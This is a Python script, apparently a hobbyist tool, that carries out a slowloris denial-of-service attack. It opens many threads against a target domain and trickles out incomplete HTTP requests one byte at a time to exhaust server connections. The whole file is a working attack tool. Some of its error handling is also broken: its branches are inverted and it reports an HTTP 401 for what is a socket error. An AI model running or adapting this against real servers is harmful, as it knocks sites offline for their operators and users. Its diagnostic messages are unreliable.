#!/usr/bin/python3
#: Title       : WebStall
#: Date        : 2018-12-17
#: Author      : "Kjetil Kristoffer Solberg" <post@ikjetil.no>
#: Version     : 0.1
#: Description : Stalls web servers.
#: Usage       : ./WebStall.py <domain> <threads> <delay sec>

#
# import
#
import ItsLog
import ItsHttp
import sys
import time
import threading
import socket
import errno
import glob

#
# Print Help
#
def PrintHelp():
    print("")
    print("Usage:")
    print(" WebStall.py [options]")
    print("")
    print("An attemt at slow loris HTTP attack")                       
    print("")
    print("Options:")
    print(" -h, --help                 display this help")
    print(" -a, --address      (1)     domain")
    print(" -d, --directory            directory with HTTP request files")
    print(" -t, --threads      (2)     number of threads.")
    print(" -s, --sleep                HTTP request chars delay - in seconds")
    print(" -e, --extension    (3)     HTTP request file extension")
    print("")
    print("(1) Required field")
    print("(2) Min: 1, Max: 999, Default: 1")
    print("(3) Default is .txt")
    print("")

#
# Get Arg Value
#
def GetArgValue(token1, token2):
    count = len(sys.argv)
    count -= 1
    i = 0
    while i < count:
        if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
            return sys.argv[i+1]
        i += 1
    return ""

def GetHasArgValue(token1, token2):
    count = len(sys.argv)
    count -= 1
    i = 0
    while i < count:
        if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
            return True
        i += 1
    return False

#
# Global ApplicationLog object
#
AppLog = ItsLog.ItsApplicationLog()
Flag = True

#
# PrintToConsole method
#
def PrintToConsole(thread_number, msg):
    print("Thread %03d :: %s" % (thread_number, msg))

class WebStallThread (threading.Thread):
   def __init__(self, domain, delay_sec, thread_number):
      threading.Thread.__init__(self)
      self.domain = domain
      self.delay_sec = delay_sec
      self.thread_number = thread_number

   def run(self):
    ihttp = ItsHttp.ItsHttp()

    PrintToConsole(self.thread_number, "Creating HTTP Socket")
    s = ihttp.CreateHttpSocket()
    
    PrintToConsole(self.thread_number, "Connecting HTTP Socket")
    ihttp.ConnectHttpSocket(s, domain)
    
    PrintToConsole(self.thread_number, "Sending HTTP Data")

    sz = "GET / HTTP/1.1\nHOST: " + domain + "\n"  # + "\n" # Do not send the last linefeed
    si = 0
    slen = len(sz)
    do_exit = False
    global Flag
    try:
        if len(directory) > 0 and len(directory_files) > 0:
            PrintToConsole(self.thread_number, "Reading from: " + directory_files[self.thread_number-1])
            f = open(directory_files[self.thread_number-1], "r")
            sz = f.read()
            slen = len(sz)
            f.close()

        while Flag == True and do_exit == False:
            if si > 0:
                if si < slen:
                    time.sleep(tts)
                else:
                    time.sleep(1)

            if si < slen:
                try:
                    ihttp.SendHttpSocket(s,sz[si:si+1])
                except socket.error as ex:
                    if ex.errno != errno.EPIPE:
                        PrintToConsole(self.thread_number, "Broken Pipe Error. Server Closed Connection.")
                        do_exit = True
                        break
                    elif ex.errno == 32:
                        PrintToConsole(self.thread_number, "HTTP Status Code = 401. Unauthorized.")
                        do_exit = True
                        break
                    else:
                        PrintToConsole(self.thread_number, "Unknown Error (%d)" % ex.errno)
                        do_exit = True
                        break
            
                si += 1
            else:
               do_exit = True
    except KeyboardInterrupt as ki:
        PrintToConsole(self.thread_number, "> Keyboard Interrupt <")
        print("> Waiting for Threads to Finish <")
        Flag = False
        do_exit = True
        ihttp.CloseHttpSocket(s)
    
    PrintToConsole(self.thread_number, "Finished")

#
# Main 
#
print("> Starting <")

domain = ""             #: domain
ttc = 1                 #: threads
tts = 0                 #: sleep sec
directory = ""          #: directory
extension = ".txt"      #: direcory extensions to look for
directory_files = []
try:
    if GetHasArgValue("-h", "--help"):
        PrintHelp()
        exit(0)
    
    domain = str(GetArgValue("-a","--address"))         #: domain
    if len(domain) <= 0:
        PrintHelp()
        exit(1)

    tmp = GetArgValue("-t","--threads")
    if len(tmp) > 0:
        try:
            ttc = int(GetArgValue("-t", "--threads"))   #: threads
            if ttc <= 0 or ttc > 999:
                PrintHelp()
                exit(1)
        except ValueError:
            ttc = 1

    tmp = GetArgValue("-s", "--sleep")
    if len(tmp) > 0:
        try:
            tts = int(GetArgValue("-s", "--sleep"))     #: delay in seconds
        except ValueError:
            tts = 0
    
    directory = str(GetArgValue("-d", "--directory"))   #: directory with http request files
    extension = str(GetArgValue("-e", "--extension"))
    if len(extension) > 0:
        if extension[0] != ".":
            extension = "." + extension
    else:
        extension = ".txt"
    if len(directory) > 0:
        if directory[len(directory)-1] != "/":
            directory = directory + "/"
        directory_files = glob.glob(directory+"*.txt")
        ttc = len(directory_files)
except ValueError as ex:
    AppLog.LogError("One or more Invalid parameter!")
    AppLog.PrintToConsole()
    exit(3)

print("> Creating Threads <")

thread_list = []
i = 0
while i < ttc:
    thread_list.append(WebStallThread(domain,tts,i+1))
    i += 1

print("> Running Threads <")
for a in thread_list:
    a.start()

print("> Working <")
try:

    for a in thread_list:
        a.join()

except KeyboardInterrupt as ki:
    print("")
    print("> Keyboard Interrupt <")
    print("> Waiting for Threads to Finish <")
    Flag = False
    for a in thread_list:
        a.join()

    print("> End of Program <")
